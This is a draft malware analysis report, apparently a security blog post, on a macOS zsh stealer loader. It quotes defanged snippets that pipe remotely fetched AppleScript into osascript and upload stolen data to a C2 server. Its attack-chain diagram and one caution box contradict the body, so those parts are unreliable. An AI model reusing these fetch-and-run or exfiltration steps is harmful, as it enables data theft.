---
title: "Malware Analysis: macOS AppleScript stealer loader (candidate) (other · zsh · 93e784fd)"
published: 2026-10-29
draft: true
description: "Malicious (low confidence): macOS AppleScript stealer loader (candidate) · stealer/loader/downloader · difficulty easy · pure static analysis"
tags: ["stealer", "loader", "downloader", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-10-29-macos-applescript-93e784fd"
---

> [!WARNING]
> **Verdict: malicious** · Family **macOS AppleScript stealer loader (candidate)** (uncertain) · Confidence **low**
> 
> Aliases: Atomic macOS Stealer (AMOS) lookalike, macOS osascript stealer/loader
> 
> The outer layer is a base64+gunzip+eval zsh loader; static decoding yields the complete 2650-byte stage2 script, which hardcodes the C2 domain and task token, fetches a remote AppleScript with curl and hands it to osascript for execution, then uploads /tmp/osalogging.zip in 10 MB chunks with PUT and deletes the temporary file. Both the malicious intent and the execution chain are directly visible in the decoded code, so dynamic execution was unnecessary.

## Overview

| Item | Content |
|:--|:--|
| Family | **macOS AppleScript stealer loader (candidate)** · aliases Atomic macOS Stealer (AMOS) lookalike, macOS osascript stealer/loader · _uncertain_ |
| Confidence | **low** |
| Behaviour class | stealer · loader · downloader |
| Difficulty | easy |
| First seen | 2026-10-29 08:25:49 |
| Analysis method | pure static analysis |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/93e784fdb589d9363643830cb1bac90ea71d62b1bbbe0cb65ef3d3d81961a7b5/) |

## Attack chain

<svg viewBox="0 0 720 226" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="150" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="38" fill="currentColor" font-weight="600" font-size="14">Config decryption</text>
<text x="250" y="38" fill="currentColor" fill-opacity="0.65" font-size="12.5">AES decrypts embedded config</text>
<text x="250" y="56" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1027</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="92" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="96" fill="currentColor" font-weight="600" font-size="14">C2 connection</text>
<text x="250" y="96" fill="currentColor" fill-opacity="0.65" font-size="12.5">Raw TCP to hardcoded C2</text>
<text x="250" y="114" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1095</text>
<text x="613" y="96" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
<circle cx="26" cy="150" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="154" fill="currentColor" font-weight="600" font-size="14">RAT / theft</text>
<text x="250" y="154" fill="currentColor" fill-opacity="0.65" font-size="12.5">shell / keylog / screen / camera</text>
<text x="250" y="172" fill="currentColor" fill-opacity="0.4" font-size="11" font-family="ui-monospace,monospace">T1059</text>
<text x="613" y="154" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">static</text>
</svg>

## Sample identity

| Item | Value |
|:--|:--|
| SHA-256 | `93e784fdb589d9363643830cb1bac90ea71d62b1bbbe0cb65ef3d3d81961a7b5` |
| MD5 | _not recorded_ |
| Size | 1,450 bytes (1.4 KB) |
| Type | other · `zsh` |

## Behaviour analysis

**8** behaviours were recovered, each with supporting evidence, and all are static.

### 1. Decode the embedded payload

`T1140` · confidence **high** · static

The outer zsh decodes the gzip data in the heredoc with base64 -D, gunzips it, and executes the resulting second script through eval; the whole loading chain is self-contained.

> **Evidence**: sample offset 0x00B: d30185=$(base64 -D <<'PAYLOAD_m98372924415082' | gunzip; offset 0x59B: eval "$d30185"
> 
> **Source**: `ev-000001` · `ev-000003`

### 2. Run silently in the background

`T1564.003` · confidence **high** · static

stage2 redirects stdin/stdout/stderr entirely to /dev/null and starts via daemon_function "$@" &, so there is no terminal output at runtime.

> **Evidence**: stage2 offsets 31/51/71: exec </dev/null, exec >/dev/null, exec 2>/dev/null; offset 2590: if daemon_function "$@" &
> 
> **Source**: `ev-000002` · `ev-000003`

### 3. Fetch the remote script

`T1105` · confidence **high** · static

It issues an HTTP GET to hxxp://youthfulintelligence[.]com/dynamic?txd=<token> to obtain the remote AppleScript, with an api-key: 5190ef1733183a0dc63fb623357f56d6 header and a forged macOS Safari User-Agent.

> **Evidence**: stage2 offset 505: "hxxp://$domain/dynamic?txd=$token&pwd=$1"; offsets 370/616 UA string; offsets 468/714 api-key header
> 
> **Source**: `ev-000002` · `ev-000003`

### 4. Execute the script delivered by the C2

`T1059.002` · confidence **high** · static

The response body downloaded by curl is not written to disk but piped directly into osascript for interpretation, with the C2 dynamically delivering subsequent AppleScript tasks.

> **Evidence**: stage2 offsets 505 and 751: curl ... "hxxp://$domain/dynamic?..." | osascript
> 
> **Source**: `ev-000002` · `ev-000003`

### 5. Exfiltrate the packaged data in chunks

`T1041` · confidence **high** · static

After checking that /tmp/osalogging.zip exists and is non-empty, it slices it into 10 MB pieces with dd and uploads each piece with curl -X PUT to /gate, carrying buildtxd/upload_id/chunk_index/total_chunks; each chunk is retried up to 8 times with increasing intervals.

> **Evidence**: stage2 offset 938 CHUNK_SIZE=10MB, 1669 dd if="$file", 1759 curl -k -s -X PUT, 2073 /gate?buildtxd=$token&upload_id=...; offset 2493 sleep retry backoff
> 
> **Source**: `ev-000002` · `ev-000003`

### 6. Delete the temporary package

`T1070.004` · confidence **high** · static

After all chunks are uploaded successfully it runs rm -f /tmp/osalogging.zip, removing the staged exfiltration data.

> **Evidence**: stage2 offset 2557: rm -f "$file"
> 
> **Source**: `ev-000002` · `ev-000003`

### 7. Send back the passphrase argument

`T1041` · confidence **medium** · static

If the script is run with an argument, the first argument $1 is appended as the pwd query parameter to the task request sent to the C2, so the value travels in cleartext in the URL.

> **Evidence**: stage2 offset 505: /dynamic?txd=$token&pwd=$1
> 
> **Source**: `ev-000002` · `ev-000003`

### 8. Task token identifies the victim

`T1071.001` · confidence **high** · static

A hardcoded 64-hex-digit txd/buildtxd token and a 32-character api-key are used to correlate the same victim's task and upload sessions between /dynamic and /gate.

> **Evidence**: stage2 offset 136 token=f2bf...d25c; offset 219 api_key=5190...; uploads use upload_id=$(date +%s)-<random>
> 
> **Source**: `ev-000002` · `ev-000003`


## IOC (defanged)

### Network

:::caution
**The real server side is still unverified**: the connection/handshake above was completed against a locally controlled emulation service; the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxp://youthfulintelligence[.]com/dynamic?txd=f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | 80 | c2 | static | ⏳ not observed |
| http | `hxxp://youthfulintelligence[.]com/gate?buildtxd=f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | 80 | exfil | static | ⏳ not observed |

### Host

**Drop paths**

- `/tmp/osalogging.zip`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `youthfulintelligence[.]com` | yes | static |
| `c2_protocol` | `http (plaintext, curl -k ignores the certificate)` | yes | static |
| `c2_port` | `80` | yes | static |
| `task_endpoint` | `/dynamic?txd=<token>[&pwd=$1]` | yes | static |
| `exfil_endpoint` | `/gate?buildtxd=<token>&upload_id=..&chunk_index=..&total_chunks=..` | yes | static |
| `campaign_id` | `f2bf008c663b1dc9f65367156664e523bd6bd3814f18f4499b465eb431eed25c` | yes | static |
| `api_key` | `5190ef1733183a0dc63fb623357f56d6` | yes | static |
| `user_agent` | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36` | yes | static |
| `staging_path` | `/tmp/osalogging.zip` | yes | static |
| `upload_chunk_size` | `10485760 (10MB)` | yes | static |
| `upload_max_retries` | `8` | yes | static |
| `encryption_algo` | `none (plaintext HTTP, no application-layer encryption)` | no | static |

## Don't misread this

:::important
The following conclusions are **easy to get wrong**; keep them in mind when citing this report.

- You cannot claim that it was detonated in a real macOS environment or that C2 communication, data theft and successful upload were actually observed: this analysis only decoded statically and read the code, without executing the sample.
- You cannot assert that the domain youthfulintelligence[.]com is currently live, who owns it, or what it resolves to; that value comes only from the sample's hardcoding and no outbound verification was performed.
- You cannot assert what the AppleScript fetched from the C2 actually steals (browser credentials, keychain, wallets, etc.) or whether it contains persistence logic; that content was not obtained.
- You cannot attribute the sample confidently to a commercial family on the osascript + zip + chunked-upload characteristics alone — the family can only be given as a candidate.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | pure static analysis |
| Unpacked | yes (stage2 `ca733ba743cb384befb7f62b9987a9e6fe76ad1ffb72dd98ec7040a392c558a7`) |

**Limitations and open questions**

1. Purely static analysis: the script was not executed and reproduced=false; all network, file and execution behaviour is inferred from the decoded code and has not been confirmed at runtime.
2. The C2 was not contacted: the domain, token, api-key and endpoints all come from hardcoding, and their liveness, response content and real upload results are unknown, pending_dynamic_verify=true.
3. The AppleScript returned by /dynamic was not obtained, so the actual theft scope, whether persistence is deployed and whether privileges are escalated cannot be confirmed.
4. Family attribution is uncertain: the sample contains no family-specific strings or configuration structure, so candidates are given on TTPs alone, with confidence=low.
5. The ZIP in the same directory is AES-encrypted with no password, so it could not be verified that its contents exactly match the .zsh (the filename and size do match).

## Evidence index

<details>
<summary>Show 3 tool evidence records</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | string extraction | ASCII strings of the outer .zsh: base64 heredoc, gunzip pipe, eval "$d30185"; no plaintext IOC. |
| `ev-000002` | string extraction | strings of the decoded stage2 script: domain=youthfulintelligence[.]com, token, api_key, /tmp/osalogging.zip, /dynamic and /gate request strings, osascript pipe, chunked PUT upload and rm cleanup. |
| `ev-000003` | evidence.record (script) | Python static decoding flow: base64-decoded heredoc → gunzip → 2650-byte stage2 (sha256 ca733b...), extracting all IOCs, offsets and the behaviour chain; the sample was not executed. |

</details>

---

_This sample is not shared; IOCs are defanged. For security research only._
